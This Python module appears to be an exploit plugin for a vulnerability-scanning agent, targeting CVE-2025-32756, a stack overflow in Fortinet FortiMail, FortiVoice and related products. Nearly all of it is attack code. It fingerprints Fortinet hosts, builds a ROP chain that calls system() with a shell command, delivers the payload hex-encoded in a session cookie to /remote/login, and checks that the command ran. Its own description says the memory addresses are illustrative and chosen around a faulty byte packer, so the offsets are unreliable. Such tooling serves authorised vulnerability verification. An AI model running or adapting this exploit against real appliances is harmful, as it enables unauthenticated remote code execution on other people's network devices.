"""Agent Asteroid implementation for CVE-2025-32756."""

import datetime
import logging
import secrets
import struct
import time
import typing

import pwn
import requests
import urllib3
from urllib3 import exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

urllib3.disable_warnings(category=exceptions.InsecureRequestWarning)

VULNERABILITY_TITLE: str = (
    "Fortinet Multiple Products - Stack-Based Overflow (CVE-2025-32756)"
)
VULNERABILITY_REFERENCE: str = "CVE-2025-32756"
VULNERABILITY_DESCRIPTION: str = """
A stack-based overflow vulnerability [CWE-121] in FortiVoice, FortiMail, FortiNDR,
FortiRecorder, and FortiCamera may allow a remote unauthenticated attacker
to execute arbitrary code or commands via crafted HTTP requests.
This exploit attempts to leverage this via a ROP chain, assuming a non-ASLR,
no-canary environment with known memory layout (offsets are illustrative).
This exploit writes a marker file for verification.
Uses Pwntools for robust address packing.
NOTE: The Python environment where this agent is run has shown anomalous
behavior in packing large integers to bytes. Addresses have been chosen
to produce safe byte sequences with the observed packer behavior,
but may not correspond to functional exploit addresses on a real target
without adjusting to a correctly functioning Python environment.
"""
RISK_RATING: str = "CRITICAL"
DEFAULT_TIMEOUT: datetime.timedelta = datetime.timedelta(seconds=10)

# --- Exploit Configuration Constants ---
TARGET_USE_HTTPS: bool = False
TARGET_VULNERABLE_PATH: str = "/remote/login"
TARGET_ARCHITECTURE: str = "amd64"
TARGET_ENDIANNESS: str = "little"

STACK_BUFFER_OFFSET: int = 64
STACK_BUFFER_SIZE: int = 256
STACK_CANARY_OFFSET: int = 0
STACK_SAVED_RBP_OFFSET: int = 328
STACK_RETURN_ADDRESS_OVERWRITE_OFFSET: int = 336

ROP_COMMAND_VERIFICATION: str = "sh -c 'echo CVE_2025_32756_PWNED > /tmp/pwned_cve2025_32756.txt && chmod 777 /tmp/pwned_cve2025_32756.txt'"
ROP_FLAT_GADGETS: dict[str, int] = {"pop_rdi_ret": 0x401A23}
ROP_MODULE_GADGET_OFFSETS: dict[str, dict[str, int]] = {}

PAYLOAD_BAD_CHARS_HEX: list[str] = ["00", "0a", "0d"]

ADDR_FIXED_INPUT_BUFFER_BASE: int = 0x41424344454645F8
ADDR_FIXED_TARGET_BINARY_BASE: int = 0x400000
ADDR_FIXED_LIBC_BASE: int = 0x7FFFF7C00000

ADDR_MODULE_OFFSETS: dict[str, dict[str, int]] = {"libc": {"system": 0x50D60}}

VERIFICATION_HTTP_FILE_PATH: str = "/pwned_cve2025_32756.txt"
VERIFICATION_HTTP_EXPECTED_CONTENT: str = "CVE_2025_32756_PWNED"
VERIFICATION_TIMEOUT_SECONDS: int = 5

STEALTH_RANDOM_PADDING_SIZE: int = 0
TRIGGER_HTTP_METHOD: str = "GET"
TRIGGER_COOKIE_NAME: str = "SESSION_ID"
TRIGGER_PAYLOAD_LOCATION: str = "cookie_hex"

TIMING_REQUEST_TIMEOUT_SECONDS: int = 10
TIMING_POST_TRIGGER_DELAY_SECONDS: int = 5
TIMING_DELAY_BETWEEN_VERIFICATION_SECONDS: int = 1

ADDRESS_PLACEHOLDER_BYTES = b"\xde\xc0\xde\xad\xbe\xef\xba\xbe"

FORTINET_ACCEPT_PATHS: list[str] = [
    "/user/login",
    "/remote/login",
    "/sl/login",
    "/voice/",
    "/admin/",
]

FORTINET_INDICATORS: list[str] = [
    "fortimail",
    "fortivoice",
    "fortindr",
    "fortirecorder",
    "forticamera",
]


def _addr_key(module: str, symbol: str | int) -> str:
    return "%s_%s" % (module, str(symbol))


@exploits_registry.register
class FortinetCVE202532756Exploit(webexploit.WebExploit):
    metadata: definitions.VulnerabilityMetadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        cve_ids=["CVE-2025-32756"],
    )
    pointer_size: int

    def __init__(self) -> None:
        super().__init__()
        self.http: requests.Session = requests.Session()
        self.http.verify = False

        if pwn is None:
            raise ImportError("Pwntools could not be imported. Exploit cannot run.")

        pwn.context.arch = TARGET_ARCHITECTURE
        pwn.context.endian = TARGET_ENDIANNESS

        if pwn.context.arch in ["amd64", "aarch64"]:
            self.pointer_size = 8
        elif pwn.context.arch in ["i386", "arm"]:
            self.pointer_size = 4
        elif hasattr(pwn.context, "bits") is True and pwn.context.bits in [32, 64]:
            self.pointer_size = pwn.context.bits // 8
        else:
            raise ValueError(
                "Could not determine pointer size for Pwntools arch: %s"
                % pwn.context.arch
            )

        self.bad_chars_set: set[int] = {int(b, 16) for b in PAYLOAD_BAD_CHARS_HEX}
        self.base_addresses: dict[str, int] = {
            "input_buffer_base": ADDR_FIXED_INPUT_BUFFER_BASE,
            "target_binary": ADDR_FIXED_TARGET_BINARY_BASE,
            "libc": ADDR_FIXED_LIBC_BASE,
        }
        self.all_gadgets: dict[str, int] = {}
        self.all_addresses: dict[str, int] = {}
        self.rop_cmd_addr_placeholder_offset: int = -1

    def _pack_address(self, addr: int) -> bytes:
        if isinstance(addr, int) is False:
            raise TypeError("Address must be int, got %s" % type(addr))

        if pwn is None:
            raise RuntimeError("Pwntools not available for packing.")

        try:
            if self.pointer_size == 8:
                return typing.cast(bytes, pwn.p64(addr))
            elif self.pointer_size == 4:
                return typing.cast(bytes, pwn.p32(addr))
            else:
                raise ValueError(
                    "Unsupported pointer size for Pwntools packing: %s"
                    % self.pointer_size
                )
        except (
            pwn.pwnlib.exception.PwnlibException,
            OverflowError,
            struct.error,
        ) as e:
            logging.error("Pwntools packing error for %s: %s", hex(addr), e)
            raise ValueError("Pwntools packing failed for %s" % hex(addr)) from e

    def _generate_safe_random_padding(self, n: int) -> bytes:
        if n <= 0:
            return b"" if n == 0 else b"\xff" * abs(n)
        if len(self.bad_chars_set) == 0:
            return secrets.token_bytes(n)
        if len(self.bad_chars_set) == 256:
            raise ValueError("All bytes forbidden for padding.")
        padding = bytearray()
        for _ in range(n * 20):
            if len(padding) >= n:
                break
            byte = secrets.token_bytes(1)[0]
            if byte not in self.bad_chars_set:
                padding.append(byte)
        if len(padding) < n:
            raise ValueError("Padding gen failed: got %d/%d bytes." % (len(padding), n))
        return bytes(padding)

    def _update_dependent_addresses(self) -> None:
        self.all_gadgets = ROP_FLAT_GADGETS.copy()
        for module, offsets in ROP_MODULE_GADGET_OFFSETS.items():
            base = self.base_addresses.get(module)
            if base is not None:
                for name, offset in offsets.items():
                    self.all_gadgets[_addr_key(module, name)] = base + offset
            else:
                logging.warning("Base for module '%s' not found for gadgets.", module)
        self.all_addresses = {}
        for module, offsets in ADDR_MODULE_OFFSETS.items():
            base = self.base_addresses.get(module)
            if base is not None:
                for name, offset in offsets.items():
                    self.all_addresses[_addr_key(module, name)] = base + offset
            else:
                logging.warning("Base for module '%s' not found for symbols.", module)
        logging.debug(
            "Gadgets: %s, Addresses: %s", self.all_gadgets, self.all_addresses
        )

    def _build_exploit_code(self) -> bytes | None:
        try:
            cmd_suffix = ROP_COMMAND_VERIFICATION.encode("utf-8") + b"\x00"
            pop_rdi = self.all_gadgets.get("pop_rdi_ret")
            if pop_rdi is None:
                logging.error("ROP build: Missing pop_rdi_ret gadget.")
                return None
            sys_addr_key = _addr_key("libc", "system")
            sys_addr = self.all_addresses.get(sys_addr_key)
            if sys_addr is None:
                logging.error("ROP build: Missing '%s' address.", sys_addr_key)
                return None

            p_pop_rdi = self._pack_address(pop_rdi)
            p_sys = self._pack_address(sys_addr)

            self.rop_cmd_addr_placeholder_offset = len(p_pop_rdi)
            rop_prim = (
                p_pop_rdi + ADDRESS_PLACEHOLDER_BYTES[: self.pointer_size] + p_sys
            )
            logging.info(
                "Built ROP (len %d) + cmd (len %d).", len(rop_prim), len(cmd_suffix)
            )
            return rop_prim + cmd_suffix
        except (ValueError, TypeError) as e:
            logging.error("ROP build error: %s", e)
            return None

    def _craft_exploit_payload(self, unpatched_code: bytes | None) -> bytes | None:
        if unpatched_code is None:
            logging.error("Unpatched code is None. Cannot craft payload.")
            return None
        try:
            canary_s = (
                (STACK_SAVED_RBP_OFFSET - STACK_CANARY_OFFSET)
                if 0 < STACK_CANARY_OFFSET < STACK_SAVED_RBP_OFFSET
                else (self.pointer_size if STACK_CANARY_OFFSET > 0 else 0)
            )
            rbp_s = self.pointer_size if STACK_SAVED_RBP_OFFSET > 0 else 0
            overwrite_block_itself_s = canary_s + rbp_s + self.pointer_size
            padding_before_ow_block = (
                STACK_RETURN_ADDRESS_OVERWRITE_OFFSET
                - overwrite_block_itself_s
                - (STACK_BUFFER_OFFSET + STACK_BUFFER_SIZE)
            )

            if padding_before_ow_block < 0:
                logging.error(
                    "Calculated padding_before_overwrite_block is negative (%d). "
                    "Check STACK_*_OFFSET and STACK_BUFFER_SIZE constants.",
                    padding_before_ow_block,
                )
                return None

            rop_chain_start_offset_in_buffer = (
                STACK_BUFFER_OFFSET
                + STACK_BUFFER_SIZE
                + padding_before_ow_block
                + overwrite_block_itself_s
                + STEALTH_RANDOM_PADDING_SIZE
            )
            rop_chain_live_address = (
                self.base_addresses["input_buffer_base"]
                + rop_chain_start_offset_in_buffer
            )

            patched_rop_code_bytes = bytearray(unpatched_code)
            if self.rop_cmd_addr_placeholder_offset != -1:
                len_rop_gadgets_for_system = (
                    self.rop_cmd_addr_placeholder_offset + self.pointer_size * 2
                )
                live_cmd_string_address = (
                    rop_chain_live_address + len_rop_gadgets_for_system
                )
                packed_cmd_string_address = self._pack_address(live_cmd_string_address)
                placeholder_start_index = self.rop_cmd_addr_placeholder_offset
                placeholder_end_index = placeholder_start_index + self.pointer_size
                patched_rop_code_bytes[
                    placeholder_start_index:placeholder_end_index
                ] = packed_cmd_string_address

            final_rop_plus_cmd_section = bytes(patched_rop_code_bytes)
            payload_prefix = bytearray()
            payload_prefix.extend(b"A" * STACK_BUFFER_OFFSET)
            payload_prefix.extend(b"A" * STACK_BUFFER_SIZE)

            if padding_before_ow_block > 0:
                payload_prefix.extend(
                    self._generate_safe_random_padding(padding_before_ow_block)
                )
            if STACK_CANARY_OFFSET > 0 and canary_s > 0:
                payload_prefix.extend(b"\xcc" * canary_s)
            if STACK_SAVED_RBP_OFFSET > 0 and rbp_s > 0:
                payload_prefix.extend(b"R" * rbp_s)

            packed_return_address = self._pack_address(rop_chain_live_address)
            payload_prefix.extend(packed_return_address)

            if STEALTH_RANDOM_PADDING_SIZE > 0:
                payload_prefix.extend(
                    self._generate_safe_random_padding(STEALTH_RANDOM_PADDING_SIZE)
                )

            scannable_prefix_part = bytes(payload_prefix[STACK_BUFFER_OFFSET:])
            bad_chars_details = []
            for i, b_val in enumerate(scannable_prefix_part):
                if b_val in self.bad_chars_set:
                    abs_offset_in_payload = STACK_BUFFER_OFFSET + i
                    bad_chars_details.append(
                        "byte 0x%02x at payload_offset %d (scannable_prefix_offset %d)"
                        % (b_val, abs_offset_in_payload, i)
                    )
            if bad_chars_details:
                scannable_hex_sample = (
                    scannable_prefix_part[:128].hex() + "..."
                    if len(scannable_prefix_part) > 128
                    else scannable_prefix_part.hex()
                )
                err_msg = (
                    "BadCharsDBG in prefix: Details: %s. "
                    "RET_ADDR_Value_Used_For_Packing: %s. "
                    "Packed_Bytes_For_RET_ADDR: %s. "
                    "ScannablePrefixHex (sample): %s"
                ) % (
                    ", ".join(bad_chars_details),
                    hex(rop_chain_live_address),
                    packed_return_address.hex(),
                    scannable_hex_sample,
                )
                raise ValueError(err_msg)

            full_payload_bytes = bytes(payload_prefix) + final_rop_plus_cmd_section
            logging.info(
                "Full payload crafted. Total length: %d", len(full_payload_bytes)
            )
            return full_payload_bytes
        except (ValueError, TypeError) as e:
            logging.error("Payload crafting error: %s", e, exc_info=True)
            return None

    def _trigger_vulnerability(
        self, payload: bytes | None, host: str, port: int
    ) -> bool:
        if payload is None:
            logging.error("Payload is None. Cannot trigger.")
            return False

        scheme = "https" if port == 443 else "http"
        url = "%s://%s:%d%s" % (scheme, host, port, TARGET_VULNERABLE_PATH)
        headers: dict[str, str] = {}
        if TRIGGER_PAYLOAD_LOCATION == "cookie_hex":
            cookies = {TRIGGER_COOKIE_NAME: payload.hex()}
        else:
            logging.error(
                "Unsupported trigger payload location: %s", TRIGGER_PAYLOAD_LOCATION
            )
            return False

        logging.info(
            "Triggering vulnerability: %s %s with payload in cookie '%s'",
            TRIGGER_HTTP_METHOD,
            url,
            TRIGGER_COOKIE_NAME,
        )
        try:
            self.http.request(
                method=TRIGGER_HTTP_METHOD,
                url=url,
                cookies=cookies,
                headers=headers,
                timeout=TIMING_REQUEST_TIMEOUT_SECONDS,
            )
            logging.info("Trigger request sent to %s.", url)
            return True
        except requests.exceptions.Timeout:
            logging.info("Trigger request to %s timed out (potentially expected).", url)
            return True
        except requests.exceptions.RequestException as e:
            logging.error("Trigger request to %s failed: %s", url, e)
            return False

    def _verify_exploit_success(self, host: str, port: int) -> bool:
        time.sleep(TIMING_POST_TRIGGER_DELAY_SECONDS)
        scheme = "https" if TARGET_USE_HTTPS else "http"
        url = "%s://%s:%d%s" % (scheme, host, port, VERIFICATION_HTTP_FILE_PATH)

        logging.info("Attempting to fetch verification file: %s", url)
        try:
            resp = self.http.get(
                url, timeout=VERIFICATION_TIMEOUT_SECONDS, allow_redirects=True
            )
            if (
                resp.status_code == 200
                and VERIFICATION_HTTP_EXPECTED_CONTENT.encode() in resp.content
            ):
                logging.info(
                    "Verification successful: Found expected content in '%s'.",
                    VERIFICATION_HTTP_FILE_PATH,
                )
                return True
            else:
                found_str = (
                    "not found"
                    if VERIFICATION_HTTP_EXPECTED_CONTENT.encode() not in resp.content
                    else "found but other condition failed"
                )
                logging.debug(
                    "Verification failed for %s: Status %d. Expected content '%s' %s.",
                    url,
                    resp.status_code,
                    VERIFICATION_HTTP_EXPECTED_CONTENT,
                    found_str,
                )
                if resp.content and len(resp.content) < 200:
                    logging.debug(
                        "Response content (first 200 bytes): %s", resp.content[:200]
                    )
        except requests.exceptions.RequestException as e:
            logging.debug("Verification HTTP request for '%s' failed: %s", url, e)
        return False

    def accept(self, target: definitions.Target) -> bool:
        host, port_ = target.host, target.port
        scheme = "https" if port_ == 443 else "http"

        head_url = "%s://%s:%d/" % (scheme, host, port_)
        try:
            logging.debug(
                "Accept: HEAD request to %s for FortiCamera header check.", head_url
            )
            head_resp = self.http.head(
                head_url, timeout=DEFAULT_TIMEOUT.seconds / 4, allow_redirects=False
            )
            if (
                "www-authenticate" in head_resp.headers
                and 'realm="FortiCamera"' in head_resp.headers["www-authenticate"]
            ):
                logging.info(
                    "Accept: FortiCamera detected by WWW-Authenticate header at %s.",
                    head_url,
                )
                return True
        except requests.exceptions.RequestException as e:
            logging.debug(
                "Accept: HEAD request for FortiCamera check to %s failed: %s",
                head_url,
                e,
            )

        for path in FORTINET_ACCEPT_PATHS:
            # Ensure path starts with a single '/'
            current_path = "/" + path.lstrip("/")
            url = "%s://%s:%d%s" % (scheme, host, port_, current_path)
            logging.info("Accept check: GET %s for content indicators", url)
            try:
                resp = self.http.get(
                    url, timeout=DEFAULT_TIMEOUT.seconds / 2, allow_redirects=True
                )
                if resp.status_code == 200 and resp.content:
                    content_lower = resp.text.lower()
                    for indicator in FORTINET_INDICATORS:
                        if indicator in content_lower:
                            logging.info(
                                "Accept: Fortinet indicator '%s' detected in page content at %s.",
                                indicator,
                                url,
                            )
                            return True
                    logging.debug(
                        "Accept: Connected to %s (status 200), no specific indicators found.",
                        url,
                    )
                elif resp.status_code < 500:
                    logging.debug(
                        "Accept: Connected to %s (status %d). Path might not exist or require auth.",
                        url,
                        resp.status_code,
                    )
                else:
                    logging.info(
                        "Accept: Server error (status %d) for %s.",
                        resp.status_code,
                        url,
                    )
            except requests.exceptions.RequestException as e:
                logging.debug("Accept: Connection to %s failed: %s", url, e)
            time.sleep(0.1)

        logging.info(
            "Accept: No definitive Fortinet indicators found for %s:%d.", host, port_
        )
        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulns: list[definitions.Vulnerability] = []
        if pwn is None:
            logging.error("Pwntools is not imported, cannot proceed with check.")
            return vulns

        self._update_dependent_addresses()
        unpatched_rop_code = self._build_exploit_code()
        if unpatched_rop_code is None:
            logging.error("Exploit ROP code build failed.")
            return vulns

        final_payload = self._craft_exploit_payload(unpatched_rop_code)
        if final_payload is None:
            logging.error("Full payload crafting phase failed.")
            return vulns

        if self._trigger_vulnerability(final_payload, target.host, target.port):
            if self._verify_exploit_success(target.host, target.port):
                logging.info(
                    "Exploit verification successful for %s:%d!",
                    target.host,
                    target.port,
                )
                vulns.append(self.create_vulnerability(target=target))
            else:
                logging.warning(
                    "Exploit verification failed for %s:%d.", target.host, target.port
                )
        else:
            logging.warning(
                "Vulnerability trigger failed or was skipped for %s:%d.",
                target.host,
                target.port,
            )

        return vulns
